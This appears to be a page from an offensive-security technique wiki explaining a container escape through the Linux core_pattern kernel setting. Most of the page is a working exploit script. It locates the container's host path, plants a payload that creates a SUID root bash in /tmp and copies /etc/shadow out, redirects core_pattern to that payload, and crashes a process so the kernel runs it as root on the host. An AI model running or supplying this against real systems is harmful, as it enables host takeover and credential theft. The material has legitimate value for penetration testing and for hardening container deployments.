---
title: "core_pattern: running a host program by crashing a process"
description: "The kernel setting /proc/sys/kernel/core_pattern can name a program, prefixed with a pipe, that receives a crashing process's core dump. The kernel runs that program as root in the host init namespace. A container with a writable host core_pattern writes a payload path, then deliberately crashes a process to execute code on the host."
keywords:
  - core_pattern
  - core dump
  - usermode helper
  - crash trigger
  - container escape
---

# core_pattern

When a process dumps core, the kernel consults `/proc/sys/kernel/core_pattern`. If that value begins with a pipe character, the kernel treats the rest as a program to execute and feeds the core dump to its standard input. Crucially the kernel runs this program as root in the host's initial namespaces, not in the namespaces of the crashing process. A container with write access to the host's `core_pattern` (host procfs mounted writable, typically with `CAP_SYS_ADMIN` or `--privileged`) can therefore set the handler to its own payload and then force a crash to trigger host execution.

Confirm writability:

```bash
cat /proc/sys/kernel/core_pattern
[ -w /proc/sys/kernel/core_pattern ] && echo writable
```

## The technique

The handler runs in the host filesystem view, so the payload path must resolve on the host. Recover this container's rootfs location on the host from the overlay `upperdir`, place the payload there, and point `core_pattern` at it:

```bash
# 1. Find where the container rootfs appears on the host
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

# 2. Write the payload at a host-resolvable path
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
cat /etc/shadow > $host/out 2>&1
SH
chmod +x /payload

# 3. Set the handler to pipe cores to the payload (host-visible path)
echo "|$host/payload" > /proc/sys/kernel/core_pattern

# 4. Crash any process to trigger a core dump
cat > /crash.c <<'C'
int main(){ *(int*)0 = 0; }
C
gcc /crash.c -o /crash 2>/dev/null && (ulimit -c unlimited; /crash)
# or in Python: python3 -c 'import ctypes; ctypes.string_at(0)'
sleep 1; cat /out
```

The crash in step 4 generates a core, the kernel invokes `|$host/payload` as root on the host, and the payload runs there. A SUID bash drop or a reverse shell is typical.

## Exploitation notes

- `ulimit -c unlimited` (or a nonzero core limit) is needed for the crashing process to actually dump; set it in the same shell before crashing.
- The handler path must be resolvable from the host root filesystem; the `upperdir` recovery is what makes this work from inside the container, exactly as in the [cgroups release_agent](../../privileged-configuration/cgroups-release-agent.md) technique.
- A read-only host procfs blocks the write; so does an unprivileged container without host procfs, since the container's own namespaced `core_pattern` would run in the container, not the host. Confirm the procfs is the host's and writable first.

## References

- [man 5 core](https://man7.org/linux/man-pages/man5/core.5.html)
- [Kernel docs: core_pattern](https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern)
- [HackTricks: core_pattern escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#proc-sys-kernel-core_pattern)
